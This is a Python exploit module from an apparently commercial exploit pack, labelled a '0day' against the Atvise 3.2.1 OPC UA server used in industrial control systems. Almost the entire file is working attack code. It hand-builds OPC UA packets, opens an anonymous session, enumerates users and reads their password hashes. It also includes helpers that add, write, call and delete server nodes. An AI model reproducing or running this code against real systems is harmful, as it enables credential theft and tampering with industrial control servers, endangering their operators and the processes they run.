#!/usr/bin/env python
import time
import socket
import struct
import cStringIO
from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_atvise_3_2_info_disclosure"
INFO['DESCRIPTION'] = "Atvise 3.2.1 Info Disclosure"
INFO['VENDOR'] = "http://www.atvise.com/"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Atvise OPC UA service allows to disclose usernames and passwords hashes.
Tested against Atvise 3.2.1 on Windows 7 SP1 x64.
"""
INFO["DOWNLOAD_LINK"] = "http://www.atvise.com/en/resources/downloads"
INFO["LINKS"] = []
INFO['CHANGELOG']="28 Jun, 2018. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 4840


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Trying to connect to %s:%s" % (self.host, self.port))
        opc = OPCUA(self.host, self.port)
        self.log("[*] Enumerating users and passwords hashes")
        users = opc.browse_request("SYSTEM.SECURITY.USERS")
        for i, user in enumerate(users):
            passwd = opc.read_request(['SYSTEM.SECURITY.USERS.%s.password' % user["name"]])
            self.log("[+] %d: %s: %s" % (i, user["name"], passwd))
        self.finish(True)


class OPCUA:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))

        self.sock = sock
        self.SECURE_CHANNEL_ID = ""
        self.AUTH_TOKEN = ""
        self.SEQUENCE_NUM = 53
        self.REQ_ID = 3
        self.REQ_HANDLE = 1000002
        self.connect()

    def connect(self):
        # data = "HELF8" + "\x00" * 9 + "\x01" + "\x00\x00\x00\x01\x00\x00\x00\x00\x04\x88\x13\x00\x00"
        endpoint = "opc.tcp://localhost:" + str(self.port)
        endpoint = struct.pack('<I', len(endpoint)) + endpoint # endpoint url
        data = '\x00' * 4 + '\x00\x00\x01\x00'+ '\x00\x00\x01\x00' + '\x00\x00\x00\x08' + '\x00\x08\x00\x00' + endpoint  # Version + RecvBuffSize + SendBuffSize + MaxMessSize + MaxChunkCount
        data = 'HELF' + struct.pack('<I', len(data) + 8) + data
        # print repr(data)
        res = self.send(data, True)  # Hello message
        # print repr(res)
        # print

        data = "4f504e4685000000000000002f000000687474703a2f2f6f7063666f756e646174696f6e2e6f72672f55412f5365637572697479506f6c696379234e6f6e65ffffffffffffffff33000000010000000100be01000072a3cb5c1a25d4010000000000000000ffffffff00000000000000000000000000000001000000010000000080ee3600".decode(
            'hex')
        res = self.send(data, True)  # OpenSecureChannelRequest
        # print repr(res)
        # print
        self.SECURE_CHANNEL_ID = res[8:12]

        data = '\x20' + '\x00'*35 + '\xff'*4 + '\x00' * 5 + '\x4c\xdd\x40\x00\x00\x00\x08'
        data = endpoint + '\x34\x00\x00\x00urn:user-PC:Certec:atvise builder 3.2.1 (7-69feaad6)' + data
        data = '\x15\x00\x00\x00http://www.atvise.com\x15\x00\x00\x00http://www.atvise.com\x02\x0e\x00\x00\x00atvise builder\x01\x00\x00\x00' + '\xff'*8 + '\x00'*4 + '\xff'*4 + data
        data = "\x00\x00\x72\xa3\xcb\x5c\x1a\x25\xd4\x01\x41\x42\x0f\x00\x00\x00\x00\x00\xff\xff\xff\xff\xf4\x01\x00\x00\x00\x00\x00" + data # ReqHeader
        data = self.SECURE_CHANNEL_ID + "\x01\x00\x00\x00\x34\x00\x00\x00\x02\x00\x00\x00\x01\x00\xcd\x01" + data
        data = "MSGF" + struct.pack('<I', len(data) + 8) + data
        res = self.send(data, True)  # CreateSessionRequest
        # print repr(data)
        # print len(data)
        # print repr(res)
        self.AUTH_TOKEN = res[71:78]
        # print repr(self.AUTH_TOKEN)

        data = "MSGF\x72\x00\x00\x00"
        data += self.SECURE_CHANNEL_ID
        data += "0100000035000000030000000100d301".decode('hex')
        data += self.AUTH_TOKEN
        data += "c313180cbd44d20142420f0000000000fffffffff4010000000000ffffffffffffffff000000000100000002000000656e01004101010d00000009000000416e6f6e796d6f7573ffffffffffffffff".decode(
            'hex')
        res = self.send(data, True)  # ActivateSessionRequest
        # print repr(res)

    def send(self, data, connect=False):
        self.sock.sendall(data)
        chunk = 32000
        if connect:
            return self.sock.recv(chunk)
        content = []
        is_chuncked = 0
        while 1:
            res = self.sock.recv(8)
            chunk_type = res[3]
            if chunk_type=='C' and not is_chuncked:
                length = struct.unpack("<I", res[4:])[0] - 8
                is_chuncked = 1
            elif is_chuncked:
                length = struct.unpack("<I", res[4:])[0] - 24
                self.sock.recv(16)
            else:
                length = struct.unpack("<I", res[4:])[0] - 8
            time.sleep(0.1)
            while 1:
                if length <= chunk:
                    content.append(self.sock.recv(length))
                    break
                content.append(self.sock.recv(chunk))
                length -= chunk
            if chunk_type == "F":
                break
        res = "".join(content)
        # print repr(res)
        return res

    def make_header(self, data):
        self.SEQUENCE_NUM += 1
        self.REQ_ID += 1
        temp = "MSGF" + struct.pack("<I", len(data) + 24)
        temp += self.SECURE_CHANNEL_ID + "\x01\x00\x00\x00"
        temp += struct.pack("<I", self.SEQUENCE_NUM) + struct.pack("<I", self.REQ_ID)
        temp += data
        return temp

    def make_request_header(self):
        self.REQ_HANDLE += 1
        data = self.AUTH_TOKEN
        data += "\x84\x84\x1a\xb4\x54\x45\xd2\x01"  # some timestamp
        data += struct.pack("<I", self.REQ_HANDLE)
        data += "\x00\x00\x00\x00"  # Diagnostics
        data += "\xff\xff\xff\xff"  # Audit entryID
        data += "\x10\x27\x00\x00"  # TimeoutHint
        data += "\x00\x00\x00"  # TypeID and Mask
        return data

    def parse_read_response(self, resp):
        ret_data = []
        buff = cStringIO.StringIO(resp)
        buff.read(44)
        results_count = struct.unpack('<I', buff.read(4))[0]
        if results_count == 0:
            return {"result": "error"}
        for i in xrange(results_count):
            mask = buff.read(1)
            value = self.parse_datatype(buff)
            if mask == "\x0d":
                buff.read(16) # Two timestamps
            elif mask == "\x09":
                buff.read(8)
            else:
                raise Exception("Unknown encoding mask")
            ret_data.append(value)
        buff.read(4) #Diagnostic info
        return ret_data

    def parse_datatype(self, buff, data=""):
        val_type = buff.read(1)
        if val_type in ['\x8f', '\x8c']: # Array of bytes and strings
            res = []
            size = struct.unpack("<I", buff.read(4))[0]
            for i in range(size):
                length = struct.unpack("<I", buff.read(4))[0]
                res.append(buff.read(length))
            return res
        elif val_type == "\x01":
            ret = struct.unpack("B", buff.read(1))[0]
            return bool(ret)
        elif val_type == "\x0c":
            length = struct.unpack("<I", buff.read(4))[0]
            return buff.read(length)
        elif val_type == "\x07" or val_type == "\x06":
            return struct.unpack("<I", buff.read(4))[0]
        elif val_type == '\x0f':
            size = struct.unpack("<I", buff.read(4))[0]
            return '0x' + buff.read(size).encode('hex')
        else:
            raise Exception("Unknown value type!")

    def read_request(self, args):
        data = "\x01\x00\x77\x02"  # Read Request
        data += self.make_request_header()
        data += "\x00" * 8  # max age
        data += "\x02\x00\x00\x00"  # Timestamps to return
        data += struct.pack("<I", len(args))
        for arg in args:
            data += "\x03\x01\x00"
            data += struct.pack("<I", len(arg))
            data += arg
            data += "\x0d\x00\x00\x00"
            data += "\xff" * 4 + "\x00\x00" + "\xff" * 4
        data = self.make_header(data)
        ret = self.send(data)
        return self.parse_read_response(ret)

    def call_request(self, node, method, *args):
        data = "\x01\x00\xc8\x02" # Call Request
        data += self.make_request_header()
        data += "\x01\x00\x00\x00" # Array size
        data += "\x03\x01\x00" + struct.pack("<I", len(node))
        data += node
        data += "\x03\x01\x00" + struct.pack("<I", len(method))
        data += method
        data += struct.pack("<I", len(args))
        for arg in args:
            ret = self.make_datatype(arg)
            data += ret
        # print repr(data)
        data = self.make_header(data)
        res = self.send(data)
        print res[82:-4]
        return res

    def make_datatype(self, value, data=""):
        if type(value) is list:
            data += "\x98" + struct.pack("<I", len(value))
            for entry in value:
                data += self.make_datatype(entry, data)
        elif value['type'] == 'datetime':
            return "\x0d" + value['value']
        elif value['type'] == "string":
            return "\x0c" + struct.pack("<I", len(value['value'])) + value['value']
        elif value['type'] == "boolean":
            return "\x01" + struct.pack("B", int(value['value']))
        elif value['type'] == 'integer':
            return "\x07" + struct.pack("<I", value['value'])
        elif value['type'] == 'node':
            return "\x11\x03\x01\x00" + struct.pack("<I", len(value['value'])) + value['value']
        return data


    def add_node_request(self, node, parent='/'):
        data = "\x01\x00\xe8\x01" # Add Node Req
        data += self.make_request_header()
        data += "\x01\x00\x00\x00" # Array size
        data += "\x00\x55\x00\x2f"
        data += "\x03\x01\x00" + struct.pack("<I", len(node))
        data += node
        data += "\x01\x00" + struct.pack("<I", len(node))
        data += node
        data += "\x01\x00\x00\x00" # Node Class(object)
        data += "\x01\x00\x62\x01\x01"
        obj_attrs = "\x00\x00\x00\x00"
        obj_attrs += "\x03\x02\x00\x00\x00en"
        obj_attrs += struct.pack("<I", len(node)) + node
        obj_attrs += "\x03\x02\x00\x00\x00en"
        obj_attrs += struct.pack("<I", len(node)) + node
        obj_attrs += "\x00" * 9
        data += struct.pack("<I", len(obj_attrs)) + obj_attrs
        data += "\x03\x01\x00"
        data += "\x26\x00\x00\x00ObjectTypes.ATVISE.Server.Remote.WebMI"
        data = self.make_header(data)
        # print repr(data)
        res = self.send(data)
        # print repr(res)

    def write_request(self, kwargs):
        data = "\x01\x00\xa1\x02" # Write Req
        data += self.make_request_header()
        data += struct.pack("<I", len(kwargs))
        for key, value in kwargs.items():
            data += "\x03\x01\x00"
            data += struct.pack("<I", len(key)) + key
            data += "\x0d\x00\x00\x00" # Attribute value
            data += "\xff\xff\xff\xff" # Index Range
            data += "\x01"
            if type(value) is bool:
                data += "\x01" # bool
                data += struct.pack("B", int(value))
            elif type(value) is dict:
                if value['type'] == 'string':
                    data += "\x8c\x01\x00\x00\x00"
                    data += struct.pack("<I", len(value['value'])) + value['value']
                elif value['type'] == 'byte':
                    data += "\x8f\x01\x00\x00\x00"
                    data += struct.pack("<I", len(value['value'])) + value['value']
            elif type(value) is int:
                data += "\x07" + struct.pack("<I", value)
            elif type(value) is str:
                data += "\x0c" + struct.pack("<I", len(value)) + value
        data = self.make_header(data)
        res = self.send(data)
        # print repr(res)

    def delete_node_request(self, node, parent='/'):
        data = "\x01\x00\xf4\x01"
        data += self.make_request_header()
        data += "\x01\x00\x00\x00" # Length
        data += "\x03\x01\x00"
        data += struct.pack("<I", len(node)) + node
        data += "\x00" #Delete References
        data = self.make_header(data)
        res = self.send(data)

    def parse_browse_response(self, resp):
        ret_data = []
        buff = cStringIO.StringIO(resp)
        common_info = buff.read(56)
        results = buff.read(4)
        results_count = struct.unpack('<I', results)[0]
        if results_count == 0:
            return {"result": "error"}
        for i in xrange(results_count):
            temp = buff.read(6)
            length = struct.unpack("<I", buff.read(4))[0]
            node_indentifier = buff.read(length)
            # Qualified Name
            id = struct.unpack("<H", buff.read(2))[0]
            length = struct.unpack("<I", buff.read(4))[0]
            qualified_name = buff.read(length)
            # Display Name
            buff.read(1)
            length = struct.unpack("<I", buff.read(4))[0]
            locale = buff.read(length)
            length = struct.unpack("<I", buff.read(4))[0]
            text = buff.read(length)
            buff.read(4)  # Node class
            mask = buff.read(1)
            if mask == "\x00":
                buff.read(1)
            elif mask == "\x03":
                buff.read(2)
                length = struct.unpack("<I", buff.read(4))[0]
                obj_type = buff.read(length)
            else:
                raise Exception("Unknown mask for browse response")
            ret_data.append(
                dict(node_id=node_indentifier, id=id, name=qualified_name, display_name=text))
        # pprint.pprint(ret_data)
        return ret_data

    def get_value(self, buff):
        val_type = buff.read(1)
        if val_type == '\x0c': # string
            length = struct.unpack("<I", buff.read(4))[0]
            value = buff.read(length)
        elif val_type == '\x0f': #bytes
            length = struct.unpack("<I", buff.read(4))[0]
            value = buff.read(length).encode('hex')
        else:
            raise Exception("Unknown data type")
        return value

    def browse_request(self, node):
        self.REQ_HANDLE += 1
        data = "\x01\x00\x0f\x02"  # Browse Request
        data += self.AUTH_TOKEN
        data += "\x84\x84\x1a\xb4\x54\x45\xd2\x01"  # some timestamp
        data += struct.pack("<I", self.REQ_HANDLE)
        data += "\x00\x00\x00\x00"  # Diagnostics
        data += "\xff\xff\xff\xff"  # Auth entryID
        data += "\x10\x27\x00\x00"  # TimeoutHint
        data += "\x00\x00\x00"  # TypeID and Mask
        data += "\x00" * 14  # View Description
        data += "\x00\x00\x00\x04"
        data += "\x01\x00\x00\x00"  # Array length
        data += "\x03\x01\x00"
        data += struct.pack("<I", len(node)) + node
        data += "\x00" * 5 + "\x21\x01" + "\x00" * 4 + "\x3f\x00\x00\x00"
        data = self.make_header(data)
        res = self.send(data)
        print repr(res)
        return self.parse_browse_response(res)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
